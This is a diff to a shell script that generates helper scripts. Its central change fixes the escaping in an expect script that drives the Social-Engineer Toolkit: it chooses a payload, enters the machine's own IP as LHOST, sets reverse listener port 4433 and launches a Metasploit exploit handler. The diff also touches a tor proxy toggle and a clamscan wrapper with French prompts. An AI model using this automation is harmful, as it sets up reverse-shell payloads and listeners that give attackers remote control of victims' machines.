@@ -43,7 +43,7 @@ echo /etc/init.d/tor stop >> proxyoff
 #set
 echo '#!/bin/bash' >> set 
 echo ip\=\"\$\(ifconfig wlan0 \|sed -n \'2p\'\| awk \'\{print \$2\}\'\)\" >> set
-echo 'echo \$ip \>\> @ip' >> set
+echo 'echo $ip > @ip' >> set
 echo ./set2 >> set
 
 #set2
@@ -56,22 +56,22 @@ echo spawn \"setoolkit\" >> set2
 echo set timeout 2 >> set2
 
 echo expect \"set\>\" >> set2
-echo send -- \"1\r\" >> set2
+echo send -- \"1\\r\" >> set2
 echo set timeout 2 >> set2
 echo expect \"set\>\" >> set2
-echo send -- \"4\r\" >> set2
+echo send -- \"4\\r\" >> set2
 echo set timeout 2 >> set2
 echo expect \"set:payloads\>\" >> set2
-echo send -- \"2\r\" >> set2
+echo send -- \"2\\r\" >> set2
 echo set timeout 2 >> set2
 echo expect \"\(LHOST\):\" >> set2
-echo send -- \"$ip\r\" >> set2
+echo send -- \"\$ip\\r\" >> set2
 echo set timeout 2 >> set2
 echo expect \"reverse listener:\" >> set2
-echo send -- \"4433\r\" >> set2
+echo send -- \"4433\\r\" >> set2
 echo set timeout 5 >> set2
 echo expect \"\(yes/no\)\" >> set2
-echo send -- \"yes\r\" >> set2 
+echo send -- \"yes\\r\" >> set2 
 echo set timeout 10 >> set2
 echo expect \"msf exploit\(handler\) \> \" >> set2
 echo send -- \"exploit\" >> set2
@@ -89,7 +89,7 @@ echo echo Quelle repertoire voulez-vous scanner ? \(\/,\/etc\/apt\/,\/root\/,...
 echo read rep >> Virus
 echo cd \$rep >> Virus
 echo clamscan -r >> Virus
-echo cd /$USERNAME/ >> Virus
+echo cd \~ >> Virus
 
 #Alias
 
